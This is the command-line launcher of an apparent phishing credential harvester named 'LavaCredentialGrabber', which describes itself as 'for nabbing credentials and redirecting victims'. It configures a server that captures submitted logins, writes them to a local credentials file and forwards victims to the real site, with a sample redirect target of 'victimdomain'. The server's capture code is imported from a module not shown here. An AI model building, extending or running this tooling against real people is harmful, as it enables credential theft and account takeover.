#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import absolute_import
import argparse
from config import ConfigManager
from server import run_app
import logging

config = ConfigManager


def copy_args_to_config(args):
    """
    Copy the contents of args to the ConfigManager class for reference by the credential grabbing server.
    :param args: The arguments to parse.
    :return: None
    """
    config.REDIRECT_URL = args.redirect_url
    config.SERVER_IP = args.server_ip
    config.SERVER_PORT = args.server_port
    config.CREDENTIALS_FILE_PATH = args.credential_file_path
    config.LOG_LEVEL = args.log_level
    config.REDIRECT_METHOD = args.redirect_method
    config.REDIRECT_TITLE = args.redirect_title


def get_log_level_from_string(log_level_string):
    """
    Get a level associated with the logging module from the given string.
    :param log_level_string: The string to parse.
    :return: A level from the logging module.
    """
    if log_level_string not in ["DEBUG", "INFO", "WARN", "ERROR", "CRITICAL"]:
        raise ValueError(
            "Received an unexpected value for log_level_string argument: %s."
            % (log_level_string,)
        )
    else:
        return getattr(logging, log_level_string)


def main():
    args = parse_arguments()
    copy_args_to_config(args)
    prepare_logging(args)
    run_app(ip_address=config.SERVER_IP, port=config.SERVER_PORT)


def parse_arguments():
    """
    Parse the arguments passed to the invocation of this script.
    :return: The arguments parsed from the invocation of this script.
    """
    parser = argparse.ArgumentParser(
        description="LavaCredentialGrabber - for nabbing credentials and redirecting victims."
    )
    parser.add_argument(
        "-ru",
        "--redirect-url",
        required=True,
        help="The URL that users should be redirected to after credential submission.",
        dest="redirect_url",
        metavar="<https://www.victimdomain.com/url/path>",
        type=str,
    )
    parser.add_argument(
        "-rm",
        "--redirect-method",
        required=False,
        help="The HTTP method (GET or POST) that should be used for submission to the pass-through "
             "site.",
        dest="redirect_method",
        metavar="<POST>",
        default="POST",
        choices=["GET", "POST"],
        type=str,
    )
    parser.add_argument(
        "-rt",
        "--redirect-title",
        required=False,
        help="The title of the form re-submission page.",
        dest="redirect_title",
        metavar="<Redirecting...>",
        default="Redirecting...",
        type=str,
    )
    parser.add_argument(
        "-si",
        "--server-ip",
        required=False,
        help="The IP address that the credential grabbing server should bind to.",
        dest="server_ip",
        metavar="<127.0.0.1>",
        default="127.0.0.1",
        type=str,
    )
    parser.add_argument(
        "-sp",
        "--server-port",
        required=False,
        help="The port that the credential grabbing server should bind to.",
        dest="server_port",
        metavar="<8080>",
        default=8080,
        type=int,
    )
    parser.add_argument(
        "-cf",
        "--credential-file",
        required=False,
        help="The local file path to the file where credentials gathered through the Tornado application "
             "should be stored.",
        dest="credential_file_path",
        metavar="</tmp/credentials.txt>",
        default="credentials.txt",
        type=str,
    )
    parser.add_argument(
        "-l",
        "--log-level",
        required=False,
        help="The level of logging to enable for the server.",
        dest="log_level",
        metavar="<DEBUG|INFO|WARN|ERROR|CRITICAL>",
        default="INFO",
        choices=["DEBUG", "INFO", "WARN", "ERROR", "CRITICAL"],
        type=str,
    )
    return parser.parse_args()


def prepare_logging(args):
    """
    Prepare logging functionality for the credential grabbing server.
    :param args: Arguments passed to the invocation of this script.
    :return: None
    """
    log_level = get_log_level_from_string(args.log_level)
    logging.basicConfig(level=log_level)


if __name__ == "__main__":
    main()
